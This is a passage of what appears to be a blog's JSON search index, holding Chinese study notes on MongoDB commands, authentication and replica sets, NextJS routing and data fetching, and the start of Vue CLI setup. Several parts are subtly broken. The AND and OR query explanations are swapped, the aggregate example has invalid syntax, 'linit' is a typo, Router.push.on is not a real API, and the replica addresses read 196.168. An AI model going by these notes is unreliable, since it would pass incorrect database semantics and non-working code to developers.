dbs\n注意：默认数据库为test，没有创建新数据库，那么就存储在test数据库中\n删除数据库（当前数据库）\ndb.dropDatabase()\n创建集合（类似于MySQL中的表）\ndb.createCollection(\u0026ldquo;hallo\u0026rdquo;)\n插入数据（插入到test集合中，当该集合不存在时，将自动创建该集合）\ndb.test.insert({\u0026ldquo;name\u0026rdquo;:\u0026ldquo;hallo\u0026rdquo;})\n查看当前已有集合\nshow collections\n或者\nshow tables\ndb.createCollection(\u0026ldquo;test\u0026rdquo;, { capped : true, autoIndexId : true, size : 102400, max : 10000 } )\n整个集合空间大小102400B, 文档最大个数为10000个\n删除集合（删除test集合）\ndb.test.drop()\n插入数据（数据结构和json一样）\ndb.test.insert() // 当数据主键已存在，抛出错误\ndb.test.insert({\rtitle: \u0026quot;小陈的辣鸡屋\u0026quot;, description: \u0026quot;小陈辣鸡屋\u0026quot;,\rby: \u0026quot;小陈的辣鸡屋\u0026quot;,\rurl: \u0026quot;https://xiaochenabc123.test.com\u0026quot;,\rtags: [\u0026quot;小陈\u0026quot;, \u0026quot;hallo\u0026quot;, \u0026quot;chenjunlin\u0026quot;],\rlikes: 1\r})\r查看插入的文档数据（默认只输出20条，输入it指令查看下一批，返回值为游标对象）\ndb.test.find()\n也可以将数据定位为一个变量\ndata=({\rtitle: \u0026quot;小陈的辣鸡屋\u0026quot;, description: \u0026quot;小陈辣鸡屋\u0026quot;,\rby: \u0026quot;小陈的辣鸡屋\u0026quot;,\rurl: \u0026quot;https://xiaochenabc123.test.com\u0026quot;,\rtags: [\u0026quot;小陈\u0026quot;, \u0026quot;hallo\u0026quot;, \u0026quot;chenjunlin\u0026quot;],\rlikes: })\r更新数据（upsert参数是表示特殊的更新，如果目标不存在，那么就是插入）\ndb.test.update({\rtitle: \u0026quot;小陈的辣鸡屋\u0026quot;,\rtags: [\u0026quot;小陈\u0026quot;, \u0026quot;hallo\u0026quot;, \u0026quot;chenjunlin\u0026quot;],\r},{$set:{\u0026quot;title\u0026quot;:\u0026quot;hallo 小陈的辣鸡屋\u0026quot;,tags: [\u0026quot;小陈\u0026quot;, \u0026quot;hallo\u0026quot;, \u0026quot;chenjunlin\u0026quot;,\u0026quot;xiaochenabc123.test.com\u0026quot;]}},{\u0026quot;upsert\u0026quot;: true})\r更新数据（主键存在则更新，不存在则插入）\ndb.test.save({\r\u0026quot;_id\u0026quot; : ObjectId(\u0026quot;610f84ac242ec572ff8a1678\u0026quot;),\r\u0026quot;title\u0026quot;: \u0026quot;小陈的辣鸡屋\u0026quot;, \u0026quot;description\u0026quot;: \u0026quot;小陈辣鸡屋\u0026quot;,\r\u0026quot;by\u0026quot;: \u0026quot;小陈的辣鸡屋\u0026quot;,\r\u0026quot;url\u0026quot;: \u0026quot;https://xiaochenabc123.test.com\u0026quot;,\r\u0026quot;tags\u0026quot;: [\u0026quot;小陈\u0026quot;, \u0026quot;hallo\u0026quot;, \u0026quot;chenjunlin\u0026quot;],\r\u0026quot;likes\u0026quot;: 666\r})\r查看更新后的数据\ndb.test.find().pretty()\n删除数据\ndb.test.remove({\r\u0026quot;title\u0026quot;: \u0026quot;小陈的辣鸡屋\u0026quot;\r},1)\r将title为小陈的辣鸡屋的第一条记录移除\n删除指定条件的数据\ndb.test.remove({\r\u0026quot;title\u0026quot;: \u0026quot;小陈的辣鸡屋\u0026quot;\r})\r删除全部数据\ndb.test.remove({})\n或者db.test.drop\n查询数据\nAND，OR\n查询条件默认为AND（和），只要有一项为真，则输出\ndb.test.find({\u0026ldquo;title\u0026rdquo;:\u0026ldquo;小陈的辣鸡屋\u0026rdquo;,\u0026ldquo;by\u0026rdquo;: \u0026ldquo;小陈的辣鸡屋\u0026rdquo;}).pretty()\nOR条件（或），需要全部项都真，则输出\ndb.test.find({$or:[{\u0026ldquo;title\u0026rdquo;:\u0026ldquo;小陈的辣鸡屋\u0026rdquo;,\u0026ldquo;by\u0026rdquo;: \u0026ldquo;小陈的辣鸡屋hallo\u0026rdquo;}]}).pretty()\n其他逻辑符：非（$not）,即非（$nor）\n条件判断\n大于（$gt）\ndb.test.find({likes : {$gt : 100}})\n大于等于（$gte）\ndb.test.find({likes : {$gte : 100}})\n小于（$lt）\ndb.test.find({likes : {$lt : 1000}})\n小于等于（$lte）\ndb.test.find({likes : {$lte : 1000}})\n组合（大于100，小于1000）\ndb.test.find({likes : {$gt : 100,$lte : 1000}})\n其他比较符：等于（$eq）,数组是否包含（$in）,不等于（$ne）,数组是否不包含（$nin）\n数组比较符：全包含（$all），大小匹配（$size），仅一个元素匹配（$elemMatch）\n按照降序输出（-1降序，1为顺序（默认为顺序，可省略1））\ndb.test.find().sort({id: -1})\n分页输出查询（这里是查看第3页的数据，每个页有5个数据）\ndb.test.find().skip(10).limit(5)\nskip: 指定跳过指定数量的数据 limit: 指定一个页有多少条数据\n投射（指定字段输出，默认输出_id，需要通过参数去除）\ndb.test.find({},{_id:0, title: 1,by: 1}).linit(5)\n聚合查询\n$match：过滤，类似于sql的where\n$project：投影，类似于sql的as\n$sort：排序，类似于sql的order by\n$group：分组，类似于sql的group by\n$skip/$limit：结果限制，类似于sql的skip/limit\n$lookup：左外连接，类似于sql的left outer join\ndb.test.aggregate({\r{$sort({_id: -1})}\r{$group: {_id: \u0026quot;$title\u0026quot;, data: {$sum :1}}}\r})\r按照id降序输出，并且按照title字段输出，每个数据累计一行输出\n查看数据库信息（其中size字段为数据库的大小，默认单位为字节,这里输出的单位是MB）\ndb.test.stats(1024*1024)\n登录验证（auth）\n选择库\nuse admin\n创建用户\ndb.createUser({\ruser:\u0026quot;root\u0026quot;,\rpwd:\u0026quot;root\u0026quot;,\rroles:[\r{\rrole:\u0026quot;userAdminAnyDatabase\u0026quot;,\rdb:\u0026quot;admin\u0026quot;\r},\r{\rrole:\u0026quot;clusterAdmin\u0026quot;,\rdb:\u0026quot;admin\u0026quot;\r},\r{\rrole:\u0026quot;dbAdminAnyDatabase\u0026quot;,\rdb:\u0026quot;admin\u0026quot;\r}\r]\r})\r如果创建普通用户，role为readWrite和read\nread：允许读数据的权限\nreadWrite：允许读和写数据的权限\nuserAdminAnyDatabase：允许管理所有数据库的用户的权限，只能用于admin用户\nclusterAdmin：获取管理集群的最高权限，只能用于admin用户\ndbAdminAnyDatabase： 获取管理所有数据库的权限，只能用于admin用户\nroot没有任何限制（吴迪）\ndb.createUser(\r{\ruser:\u0026quot;root\u0026quot;,\rpwd:\u0026quot;pwd\u0026quot;,\rroles:[\u0026quot;root\u0026quot;]\r}\r)\r启用auth\nmongod.conf\nsecurity: authorization: enabled\n或者\nmongo.conf\nauth=true\n也是可以终端 mongod \u0026ndash;auth\n注意：MongoDB允许同user，但是db不允许相同，因为同用户名的用户之间是根据db参数区别的，db参数就是该用户在该数据库的权限（admin用户除外）\n查看用户\nshow users\n修改密码\ndb.changeUserPassword(\u0026ldquo;admin\u0026rdquo;, \u0026ldquo;abc123\u0026rdquo;)\n或者\ndb.runCommand(\r{\rupdateUser:\u0026quot;admin\u0026quot;,\rpwd:\u0026quot;abc123\u0026quot;,\r}\r)\r删除用户\ndb.dropUser(\u0026lsquo;root\u0026rsquo;)\n验证用户（用户鉴权）（符合1表示验证成功，0为失败）\ndb.auth(\u0026lsquo;admin\u0026rsquo;, \u0026lsquo;abc123\u0026rsquo;)\n登录\nmongo -u admin -p abc123 \u0026ndash;host localhostt \u0026ndash;port 27017 \u0026ndash;authenticationDatabase admin\n或者\nmongo mongodb://admin:abc123@127.0.0.1:27017\nmongo shell 基于JavaScript语法，因此可以执行JavaScript程序，其JavaScript解析器引擎为SpiderMonkey（正是Firefox浏览器同款解释器，由Mozilla提供）（注意：在3.2+版本，才是SpiderMonkey引擎，之前的版本是v8引擎）\n索引，通过关键词来快速得到自己想要的数据\n升序输出单字段索引 db.test.ensureIndex({title:1})\n复合索引就是多字段组合的索引\ndb.test.ensureIndex({_id:1, title:1})\n数组索引（tags字段是一个数组）\ndb.test.ensureIndex({tags:1})\n注意：MongoDB不允许在复合索引中出现多个数组字段\n唯一性约束（保证数据的唯一性，写入重复的数据，会导致报错（输出的字段也不是唯一的也报错），使用unique: true声明）\ndb.test.ensureIndex({title:1}, {unique: true})\n数组索引的唯一性并不能保证数组元素的唯一性\nTTL索引（数据老化处理）\ndb.test.ensureIndex({Date:1}, {expireAfterSeconds: 60})\n创建一个TTL索引，指向Date字段，并且expireAfterSeconds: 60表示该数据60秒后过期（过期后，会进行清理该数据）\n修改过期时间（已创建TTL索引）\ndb.runCommand({collMod:\u0026ldquo;test\u0026rdquo;,index: {keyPattern:{Data:1},expireAfterSeconds: 600}})\n修改过期时间为10分钟\nMongoDB允许多个结构不同的数据存储在同一个数据库中（索引该数据时，不存在的字段将输出null）\n稀疏索引\ndb.test.ensureIndex({title:1}, {sparse: true})\n文本索引\ndb.test.ensureIndex({title: \u0026ldquo;text\u0026rdquo;, by: \u0026ldquo;text\u0026rdquo;})\n通过文本索引进行搜索文本（通过$text操作符输出包含$search指向的关键词的数据，对中日韩等语言支持不怎么理想，对英文支持很好）\ndb.test.find({$text: {$search: \u0026ldquo;chen\u0026rdquo;}})\n模糊索引（假设data是一个嵌套数据，其下还有多个不同的属性）\ndb.test.createIndex({\u0026ldquo;data.$**\u0026rdquo;: 1})\n副本集架构（由一个主节点和多个副本节点组成）\n主节点写入数据后，副本节点进行同步复制工作，确保副本节点拥有和主节点的数据副本，当主节点发生故障不可用时，副本节点将通过Raft算法选举出新的主节点（这个步骤是全自动的，无需进行额外配置）\nRaft选举算法：主节点会向副节点发送心跳包，确保主节点存活，如果在一段时间内副节点没有接收到心跳包，副节点将转换为候选者，候选者得到投票数最多者成为主节点（副节点在每个选举期中只能给候选者投一票，而且只有当对方的任期时间和日志时间与自己一样新时，才进行投票给对方，如果没有得到最多数票，会重新发起选举，如果在该选举期中发现有主节点的心跳包时，进行判断对方任期是否和自己一样新，如果是则为副节点，如果不是，继续选举）\n只能是当任期结束了或者主节点没有发送心跳包了才会触发选举，而且Raft使用了一种预投票的机制（preVote），通过预投票的方式来试探是否选举成功，只有当预投票通过才能发起真实的投票\nMongoDB基于Raft算法进行了一些扩展，例如副节点可以选择离自己最近（心跳延时）的节点来复制数据，并不一定要向主节点复制数据\nMongoDB的选举：具备投票权的节点之间互相发送心跳（默认每2秒发送一次心跳包），当5次心跳没有接收到时，认定该节点失联，如果失联是主节点，会发起选举，成为候选者，如果失联的是副节点，则不会发起选举，成为候选者后，其他节点只有当对方的oplog日志和自己一样新时，投票给对方，一个节点一个选举期内只能投一票，候选者票数占大数时为主节点，如果主节点突然存活了，则判断该节点的oplog日志是否和自己一样，如果不是则继续选举，如果是则放弃选举，重新恢复到副节点身份\noplog同步数据，主节点当一个写操作完成时，向oplog写入一条日志，副节点通过该oplog拉取新日志，达到数据同步\n当主节点发生修改，插入，更新，删除等操作时，主节点会将这些操作记录下来，而这个记录叫oplog\n副节点通过在主节点上打开tailable游标来获取主节点的新oplog，并且将oplog的记录在自身回放，来保持于主节点的数据一致\n注意：oplog的容量并不是无限的，是有固定大小的，当容量满了，会将旧日志滚动清理\n副本集架构在实现高可用的同时，也可以完成读写分离，数据分发，异地容灾\n一个副本集架构最少需要3个节点（并且节点都具备投票权）：一个主节点，2个副节点\n主节点接受写入工作，副节点承担复制主节点的数据工作\n副本集最多50个节点，具备选举投票权节点最多7个，其他节点则不参与投票\n成为主节点的节点选举必须是集群中大多数节点存活（选举投票权节点有7个时，最少要有4个选举节点存活），并且该节点能于多数节点连接通信，而且具备较新的oplog，而且还可以设置优先级来影响选举结果\n副本集节点的选配设置：是否具备投票权（v），优先级（优先级为0则表示该节点不会成为主节点，优先级越高则优先成为主节点，priority），隐藏（对应用不可见，但是可以复制主节点数据，隐藏节点可以具备投票权，但是优先级必须为0（不能成为主节点）hidden），延迟（复制多少秒之前的数据，保持于主节点的数据时间差（避免主节点数据因为误操作而导致副本集节点也跟着更新了），slaveDelay）\n副本集节点注意：副节点存在成为主节点的可能，因此不要将一些副节点的硬件配置设置很低，应该保持和主节点的配置一致，而且硬件尽量保持独立性，副本集节点软件版本应保持一致，增加副本节点不会提高副本集架构的写入性能，副本集的写入由主节点完成，主节点只能有一个，增加副本节点只能提高读的性能（读写分离，主写，副读）\n搭建mongodb副本集\n每个mongodb实例需要一个数据目录来存储数据文件，每个mongodb实例需要一个配置文件和一个日志文件\n副本集节点mongod.conf实例：\nsystemLog:\rdestination: file\rpath: \u0026quot;/mongodb1/mongodb.log\u0026quot; # 日志文件路径\rlogAppend: true # 实例重新启动时，将写入日志的末尾\rstorage:\rdbpath: \u0026quot;/mongodb1/data\u0026quot; # 数据存储目录\rjournal: enabled: true # 启用持久性日志\rprocessManagement:\rfork: true # 使用守护进程（独立进程）的模式运行实例\rpidFilePath: \u0026quot;/data/mongodb.pid\u0026quot; # 保存实例进程id的文件路径，会将pid写入到该文件中\rnet:\rbindIP: 0.0.0.0 # 0.0.0.0表示所有网卡都监听，如果设置为127.0.0.1，外界无法访问\rport: 27017\rreplication:\rreplSetName: a1 #副本集节点名称\r以配置文件的模式启动mongodb实例\nmongod -f db/mongod.conf\n查看mongod进程运行情况\nps -ef | grep mongod\n配置副本集\n进入一个节点，初始化，再将节点一个个传进副本集\nrs.initiate()\rrs.add('mongodb1:27017')\rrs.add('mongodb2:27017')\rrs.add('mongodb3:27017')\rmongodb1需要被解析（hosts文件配置主机名）\n或者节点初始化时就配置好\nrs.initiate({\r_id: 'rs0',\rmembers: [{\r_id: 0,\rhost: '196.168.1.2:27017'\r},{\r_id: 1,\rhost: '196.168.1.3:27017'\r},{\r_id: 2,\rhost: '196.168.1.4:27017'\r}]\r})\r验证副本集是否工作：在主节点上写入，然后在副节点上读，如果读到则表示工作正常\n分片集群架构\n\u0026ndash;\n数据模型设计\n数据模型是由一组符号，文本组成的集合，用来表达信息\n组成一个数据模型的元素有实体（Entity），属性（Attribute），以及关系（Relationship）\n传统的模型设计：概念模型（CDM），逻辑模型（LDM），物理模型（PDM）\nJSON文档模型设计（通过字段或者集合来表示关系）\n事务开发\nmongodb提供了事务来保证数据不丢失\n写入操作事务\nwritConcern决定一个写入操作落到多少个节点才算成功，取值为0时表示不关心，1至集群max节点数表示写入操作被复制到指定节点数才算成功，majority表示写入操作被复制到大多数节点才算成功，all表示全部节点都被写入时认定成功\n注意：当设置非0的值时，发起写入操作将导致阻塞，一直到认为成功为止\njournal决定这个节点写入操作如何才算成功，true表示写入操作落到journal文件中时认定成功，false表示写入操作落到内存时就认定成功\ndb.test.insert({count: 1}, {writConcern: {w: \u0026ldquo;majority\u0026rdquo;})\n读取操作事务\nreadPreference决定数据从哪个节点读，primary表示只选择主节点读，primaryPreferred表示优先选择主节点，如果不可用则选择副节点，secondary表示只选择副节点，secondaryPreferred表示优先选择副节点，如果副节点不可用，则选择主节点，nearest表示选择最近的节点（通过ping延迟来选择最近）\n在连接时设置\nmongodb://196.168.1.2:27017,196.168.1.3:27017,196.168.1.4:27017/?replicaSet=rs\u0026amp;readPreference=nearest\n或者在mongo shell设置\ndb.collection.find({}).readPref(\u0026rsquo;nearest\u0026rsquo;)\nreadConcern决定什么数据可以读，available表示读取全部可用数据，local表示全部可用并且熟悉当前分片的数据，majority表示读取在大多数节点上完成的数据，linearizable表示可线性化读取（只读取大多数节点确认的数据（会等待其他节点去更新，最后读取最新的数据，比majority更安全，但是读取数据时很慢，需要等待节点更新）），snapshot表示读取最近快照中的数据（只读同一个快照下的数据）\nmongodb通过维护快照来链接不同版本的数据（MVCC机制），被大多数节点确认过的版本都是快照，快照一直持续没有被使用才会被删除\n安全的读写分离：搭配writConcern和readConcern，writConcern和readConcern都设置为majority，表示数据写入安全和数据读取安全\n事务的ACID：原子性，一致性，隔离性，持久性\n事务完成之前，事务外的操作对该事务的修改不可访问\n","permalink":"https://99999.fun/posts/76/","summary":"MongoDB是一个以键值对存储数据的数据库（基于json描述数据，实质上是一个叫BSON的数据格式，BSON是基于二进制字节流，json基于文本）\nMongoDB是No SQL家族的成员之一，No SQL一般指的是非关系型数据库（Not only SQL）\n关系型数据库和Excel表格类似，表与表之间存在着复杂的关联关系，例如MySQL，sql server\n而非关系型数据库不使用SQL作为查询，不需要遵循ACID（Atomicity Consistency Insolation Durability）\n基于json有个好处就是不需要额外对数据进行转换（例如sql，在调用其数据时需要进行数据的转换）\nMongoDB使用了WiredTiger存储引擎（3.2+版本开始为默认引擎），利用可用内存来缓存数据，来提供优秀的读取性能，该引擎使用WiredTiger内部缓存和文件系统缓存这俩种缓存\nWiredTiger提供了内存快照，而且每隔60秒（创建检查点）就将内存快照写入磁盘（数据持久化，而且持久化的数据还可以作为校验，确保数据在最后一个检查点是一致的，而且旧检查点可以作为有效检查点恢复因为写入新检查点时的错误而且重启导致丢失的数据）\n对于60秒内的数据丢失，WiredTiger采用了Journal机制（WAL预写日志）来提供断电保护，Journal每隔100ms刷新日志，数据被存储在Journal文件（发生断电情况，可通过Journal文件根据记录追加数据），Journal机制会保留检查点之间保留所有数据修改\n而且不用担心100ms以内的数据丢失，因为MongoDB提供了其特有的写入安全机制（Write Concern），默认使用Acknowledged安全策略，该策略在每次写入操作时确认状态，这个状态取决于内存的写入（不保证数据不丢失）\nJournaled策略要求每一次写入操作必须在journal落盘后（确保数据不丢失，吞吐和响应会有影响），该策略会确认落盘后等待30ms，将30ms内的全部写入操作统一按照顺序写入盘中\nmajority副本集策略要求只有当数据被复制到绝大多数节点（包括主节点）后才应答（适合集群）\nWrite Concern用法\n例如：\ndb.test.insert({\u0026ldquo;name\u0026rdquo;:\u0026ldquo;hallo\u0026rdquo;},{writeConcern:{w:1}})\nw有这几个常用值，分别为0（非应答式写入），1（应答式写入），\u0026gt;1（设置副本写入节点数量），majority(表示majority副本集策略)\n而且还提供了wtimeout参数来限制节点写入时间（超过该时间，报错，只适用集群环境，单位ms）\nj参数是用来开启写入操作必须在写入journal日志后响应（Journaled策略，参数值为布尔值）\nMongoDB有三种集群部署架构，主从，副本集，分片\n一个副本集架构由一个主节点和多个副本节点组成，个主节点和多个副本节点的数据同步基于oplog，当主节点发生故障，副本节点会自动选择一个新的主节点来继续工作\n在分片架构上，数据均衡分布在每一个节点上（负载均衡），可通过增加或者减少分片来实现按需扩展，\n简单使用MongoDB数据库\nmongod.conf文件是MongoDB数据库配置文件\n启动数据库（没有该数据库则创建数据库）\nmongod \u0026ndash;dbpath D:\\mongodb\n默认端口为27017\n启动服务\nnet start mongodb\n连接数据库\nmongo \u0026ndash;port 27017\n切换数据库（没有该数据库就会创建）\nuse demo\n查看全部数据库\nshow dbs\n注意：默认数据库为test，没有创建新数据库，那么就存储在test数据库中\n删除数据库（当前数据库）\ndb.dropDatabase()\n创建集合（类似于MySQL中的表）\ndb.createCollection(\u0026ldquo;hallo\u0026rdquo;)\n插入数据（插入到test集合中，当该集合不存在时，将自动创建该集合）\ndb.test.insert({\u0026ldquo;name\u0026rdquo;:\u0026ldquo;hallo\u0026rdquo;})\n查看当前已有集合\nshow collections\n或者\nshow tables\ndb.createCollection(\u0026ldquo;test\u0026rdquo;, { capped : true, autoIndexId : true, size : 102400, max : 10000 } )","title":"MongoDB学习笔记"},{"content":"NextJS是一个用于生产环境的react框架，可以提供服务器端渲染等等功能\n服务端渲染（ssr）：后端调用数据库获取数据后，将数据和页面元素进行组合成完整的DOM结构，再返回给浏览器，提供给用户浏览\nSPA：\n全称single page web application\n单一页面，加载慢，百度目前不支持spa的SEO\nNextJS：\n服务端渲染，服务端和客户端数据同步，插件丰富，搭建轻量，灵活配置\n手动配置：\nyarn add react react-dom next\nyarn init\n修改package.json文件\n在scripts下加添加\n\u0026ldquo;dev\u0026rdquo; : \u0026ldquo;next\u0026rdquo;, \u0026ldquo;build\u0026rdquo;: \u0026ldquo;next build\u0026rdquo;, \u0026ldquo;start\u0026rdquo;: \u0026ldquo;next start\u0026rdquo;\n创建个js文件\nfunction Hallo(){\rreturn(\r\u0026lt;div\u0026gt;hallo next.js\u0026lt;/div\u0026gt;\r)\r}\rexport default Hallo\ryarn dev调试\n如果浏览器输出正确则配置成功\n通过create-next-app脚手架创建项目\nnpm install create-next-app -g\n或者\nyarn add create-next-app -g\n创建create-next-app项目\nnpx create-next-app demo\n或者\nyarn create-next-app demo\n跑create-next-app项目\nyarn dev\n访问http://localhost:3000/，正常显示网页则配置正常\n编程式跳转\nimport Link from \u0026quot;next/link\u0026quot;\r\u0026lt;Link href=\u0026quot;/\u0026quot;\u0026gt;\u0026lt;a\u0026gt;返回\u0026lt;/a\u0026gt;\u0026lt;/Link\u0026gt;\rLink不支持直接加兄弟标签，起码要有一个父级标签\n利用Router实现跳转\nimport Router from \u0026quot;next/router\u0026quot;\r\u0026lt;button onClick={()=\u0026gt;{Router.push(\u0026quot;/\u0026quot;)}}\u0026gt;返回\u0026lt;/button\u0026gt;\r路由跳转通过query传递参数和接收参数\n传递参数\n\u0026lt;Link href=\u0026quot;/hallo?name=hallo\u0026quot;\u0026gt;\u0026lt;a\u0026gt;返回\u0026lt;/a\u0026gt;\u0026lt;/Link\u0026gt;\r接收参数\nimport {withRouter} from \u0026quot;next/router\u0026quot;\rconst Hallo = ({router}) =\u0026gt;{\rreturn(\r\u0026lt;div\u0026gt;\r\u0026lt;div\u0026gt;{router.query.name} word\u0026lt;/div\u0026gt;\r\u0026lt;Link href=\u0026quot;/\u0026quot;\u0026gt;\u0026lt;a\u0026gt;返回\u0026lt;/a\u0026gt;\u0026lt;Link\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rexport default withRouter(Hallo)\r也是可以用编程式跳转的方式\n函数的方式\nfunction goData(){\rRouter.push('/hallo?name=hallo')\r}\r或者用对象的方式\nRouter.push({\rpathname: \u0026quot;/hallo\u0026quot;,\rquery: {name: \u0026quot;hallo\u0026quot;}\r})\r路由的钩子函数\nrouteChangeStart // 路由将发生变化的时候触发\nrouteChangeComplete // 路由发生变化完成\nbeforeHistoryChange // 在history触发前，nextjs路由变化默认是通过history进行的\n正常情况下先触发routeChangeStart，然后beforeHistoryChange，再触发routeChangeComplete\nrouteChangeError // 路由变化发生错误时\nhashChangeStart // hash路由将发生变化的时候触发\nhashChangeComplete // hash路由发生变化完成\nhash路由（锚点）\n\u0026lt;div\u0026gt;\r\u0026lt;Link href=\u0026quot;#hallo\u0026quot;\u0026gt;\u0026lt;a\u0026gt;选hallo\u0026lt;/a\u0026gt;\u0026lt;/Link\u0026gt;\r\u0026lt;/div\u0026gt;\r钩子触发调用自定义函数\nRouter.push.on(\u0026quot;routeChangeStart\u0026quot;,(...url)=\u0026gt;{\rconsole.log(\u0026quot;routeChangeStart触发\u0026quot;,...url)\r})\raxios从远端获取数据\nimport axios from \u0026quot;axios\u0026quot;\rHallo.getInitialProps = async() =\u0026gt;{\rconst promise = new Promise((resolve)=\u0026gt;{\raxios(\u0026quot;url\u0026quot;).then(\r(datas)=\u0026gt;{\rconsole.log(datas)\rresolve(datas.data.data)\r}\r)\r})\rreturn await promise\r}\rexport default withRouter(Hallo)\rStyle JSX，Next.js\n\u0026lt;style jsx\u0026gt;\r{`\rdiv{color: red;}\r.post{color: red;}\r`}\r\u0026lt;/style\u0026gt;\r使用jsx，nextjs会自动加入随机类名，防止css污染\n自定义Head\nimport Head from \u0026quot;next/head\u0026quot;\r...\r...\r\u0026lt;Head\u0026gt;\r\u0026lt;title\u0026gt;hallo word\u0026lt;/title\u0026gt;\r\u0026lt;/Head\u0026gt;\rnext打包\nnext build\n运行\nnext start -p 8000\n如果使用antd，打包失败，可以在page目录下建_app.js文件\nimport App from 'next/app'\rimport 'antd/dist/antd.css'\rexport default App\r然后再打包\n页面\n/pages/demo.js\nfunction Demo(){\rreturn(\u0026lt;h2\u0026gt;test\u0026lt;/h2\u0026gt;)\r}\rexport default Demo\rNext会自动完成路由配置\n自定义组件\n/components/demo.js\nexport default ({data})=\u0026gt;\u0026lt;h2\u0026gt;{data}\u0026lt;/h2\u0026gt;\r导入组件\nimport Demo from '../components/demo'\r...\r\u0026lt;Demo\u0026gt;test\u0026lt;/Demo\u0026gt;\r搭配Axios获取远端数据（Next中提供了getInitialProps方法来获取）\n/pages/demo.js\nimport axios from 'axios'\rDemo.getInitialProps = async ()=\u0026gt;{\rconst promise =new Promise((resolve)=\u0026gt;{\raxios('https://xiaochenabc123.test.com/feed/').then(\r(res)=\u0026gt;{\rconsole.log('远程数据结果：',res)\rresolve(res.data.data)\r}\r)\r})\rreturn await promise\r}\rNext CSS(style jsx)\n\u0026lt;style jsx\u0026gt;\r{`\rh2{color: #000;}\r`}\r\u0026lt;/style\u0026gt;\r注意：使用style jsx了，Next会自动生成一个随机类名，来避免CSS的全局污染\nLazyLoading 模块懒加载\nfunction MainData(){\rconst Data= async ()=\u0026gt;{ const axios = await import('axios')\r...\r} 当该函数触发异步加载该模块\n懒加载组件\nimport dynamic from \u0026rsquo;next/dynamic\u0026rsquo; const Demo = dynamic(import(\u0026rsquo;../components/Demo\u0026rsquo;))\n只有当需要用到组件才会被加载，利用的是next提供dynamic模块\n自定义（next自身已经定义了head组件，只需要导入就是可以用了）\nimport Head from 'next/head'\rconst Header = ()=\u0026gt;{\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;Head\u0026gt;\r\u0026lt;title\u0026gt; 小陈的辣鸡屋 \u0026lt;/title\u0026gt; \u0026lt;/Head\u0026gt;\r\u0026lt;/\u0026gt;\r)\r}\rexport default Header\rantd依赖\n安装next css配置\nNextJS使用@zeit/next-css将会警告，请卸载@zeit/next-css\nWarning: Built-in CSS support is being disabled due to custom CSS configuration being detected.\nantd 按需加载（babel-plugin-import）（当需要哪个组件才会加载到生产环境中，而且不是整个antd）\nyarn add babel-plugin-import\n根目录新建.babelrc配置\n{\r\u0026quot;presets\u0026quot;:[\u0026quot;next/babel\u0026quot;],\r\u0026quot;plugins\u0026quot;:[ [\r\u0026quot;import\u0026quot;,\r{\r\u0026quot;libraryName\u0026quot;:\u0026quot;antd\u0026quot;,\r\u0026quot;style\u0026quot;:\u0026quot;css\u0026quot;\r}\r]\r]\r}\rTurbopack是基于Rust开发的打包器，使用Rust的SWC编译器，Turbopack将作为Nextjs的开发服务端，提供强大的HMR支持，目前还在alpha测试中，可以通过yarn dev \u0026ndash;turbo运行next13项目体验\nTurbopack基于Rust开源的Turbo记忆化框架，Turbo可以缓存函数的结果（存储在内存中，只有当停止dev服务时清除缓存，但是Turbopack也提供了远程缓存来对于生产环境的使用（基于Git）），第二次运行时，不会执行函数，而是直接使用结果，除非发生改变\n","permalink":"https://99999.fun/posts/74/","summary":"NextJS是一个用于生产环境的react框架，可以提供服务器端渲染等等功能\n服务端渲染（ssr）：后端调用数据库获取数据后，将数据和页面元素进行组合成完整的DOM结构，再返回给浏览器，提供给用户浏览\nSPA：\n全称single page web application\n单一页面，加载慢，百度目前不支持spa的SEO\nNextJS：\n服务端渲染，服务端和客户端数据同步，插件丰富，搭建轻量，灵活配置\n手动配置：\nyarn add react react-dom next\nyarn init\n修改package.json文件\n在scripts下加添加\n\u0026ldquo;dev\u0026rdquo; : \u0026ldquo;next\u0026rdquo;, \u0026ldquo;build\u0026rdquo;: \u0026ldquo;next build\u0026rdquo;, \u0026ldquo;start\u0026rdquo;: \u0026ldquo;next start\u0026rdquo;\n创建个js文件\nfunction Hallo(){\rreturn(\r\u0026lt;div\u0026gt;hallo next.js\u0026lt;/div\u0026gt;\r)\r}\rexport default Hallo\ryarn dev调试\n如果浏览器输出正确则配置成功\n通过create-next-app脚手架创建项目\nnpm install create-next-app -g\n或者\nyarn add create-next-app -g\n创建create-next-app项目\nnpx create-next-app demo\n或者\nyarn create-next-app demo\n跑create-next-app项目\nyarn dev\n访问http://localhost:3000/，正常显示网页则配置正常\n编程式跳转\nimport Link from \u0026quot;next/link\u0026quot;\r\u0026lt;Link href=\u0026quot;/\u0026quot;\u0026gt;\u0026lt;a\u0026gt;返回\u0026lt;/a\u0026gt;\u0026lt;/Link\u0026gt;\rLink不支持直接加兄弟标签，起码要有一个父级标签","title":"NextJS学习笔记"},{"content":"Vue CLI是vue官方脚手架，可以快速创建vue项目\n安装vue-cli3\nnpm install -g @vue/cli\n或者\nyarn global add @vue/cli\n升级\nnpm update -g @vue/cli\n或者\nyarn global upgrade \u0026ndash;latest @vue/cli\n创建vue项目\nvue create vue-demo\n如果提示vue : 无法将“vue”项识别为 cmdlet、函数、脚本文件或可运行程序的名称，可以使用npx vue create vue-demo\ndefault (babel, eslint) // 默认选项，包含babel和eslint\nManually select features // 自定义创建配置工程\n一般比较常用的有Babel，TypeScript，Router，CSS Pre-processors，Linter / Formatter\n空格为选择，enter为下一步\n跑vue项目\nnpm run serve\n或者\nyarn start/yarn run dev\n如果运行报错error Component name \u0026ldquo;Home\u0026rdquo; should always be multi-word vue/multi-word-component-names\n只需要在vue.config.js添加lintOnSave: false配置，例如：\nmodule.exports = defineConfig({\rtranspileDependencies: true,\rlintOnSave: false\r})\r这个问题的原因在于vue-cli默认开启了ESLint检测，关闭就好了\nVue-router是vue官方推出的vue官方路由管理工具，和vue核心深度集成\n该Vue-router路由被用于单页面应用，组件的切换，而不想其他那样可以使用超链接来切换页面\n安装router\nnpm install vue-router \u0026ndash;save-dev\n或者\nvue add router\n例如：\nApp.vue\n\u0026lt;template\u0026gt;\r\u0026lt;router-link to=\u0026quot;/Home/Index\u0026quot;\u0026gt;hallo index\u0026lt;/router-link\u0026gt;\r\u0026lt;router-link to=\u0026quot;/Hallo\u0026quot;\u0026gt;hallo\u0026lt;/router-link\u0026gt;\r\u0026lt;router-view\u0026gt;\u0026lt;/router-view\u0026gt;\r\u0026lt;/template\u0026gt;\rrouter.js\nimport {createRouter, createWebHashHistory} from 